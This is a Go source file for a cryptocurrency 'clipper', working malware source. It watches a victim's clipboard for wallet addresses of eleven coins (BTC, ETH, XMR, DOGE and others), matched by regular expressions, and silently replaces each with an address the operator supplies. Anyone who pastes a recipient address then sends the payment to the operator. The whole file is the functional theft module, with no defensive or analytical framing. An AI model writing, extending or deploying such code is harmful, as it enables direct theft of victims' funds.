package clipper

import (
	"context"
	"golang.design/x/clipboard"
	"regexp"
)

// Run watches the clipboard for cryptocurrency addresses and replaces them with the given address.
// The supported cryptocurrencies are BTC, BCH, ETH, XMR, LTC, XCH, XLM, TRX, ADA, DASH, and DOGE.
func Run(cryptos map[string]string) {
	var regexs = map[string]*regexp.Regexp{
		"BTC":  regexp.MustCompile("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"),
		"BCH":  regexp.MustCompile("^((bitcoincash:)?(q|p)[a-z0-9]{41})"),
		"ETH":  regexp.MustCompile("^0x[a-fA-F0-9]{40}$"),
		"XMR":  regexp.MustCompile("^4([0-9]|[A-B])(.){93}$"),
		"LTC":  regexp.MustCompile("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"),
		"XCH":  regexp.MustCompile("^xch1[a-zA-HJ-NP-Z0-9]{58}$"),
		"XLM":  regexp.MustCompile("^G[0-9a-zA-Z]{55}$"),
		"TRX":  regexp.MustCompile("^T[A-Za-z1-9]{33}$"),
		"ADA":  regexp.MustCompile("addr1[a-z0-9]+"),
		"DASH": regexp.MustCompile("^X[1-9A-HJ-NP-Za-km-z]{33}$"),
		"DOGE": regexp.MustCompile("^(D|A|9)[a-km-zA-HJ-NP-Z1-9]{33}$"),
	}


	for data := range clipboard.Watch(context.TODO(), clipboard.FmtText) {
		for crypto, regex := range regexs {
			if regex.Match(data) && regex.MatchString(cryptos[crypto]) {
				clipboard.Write(clipboard.FmtText, []byte(cryptos[crypto]))
			}
		}
	}
}
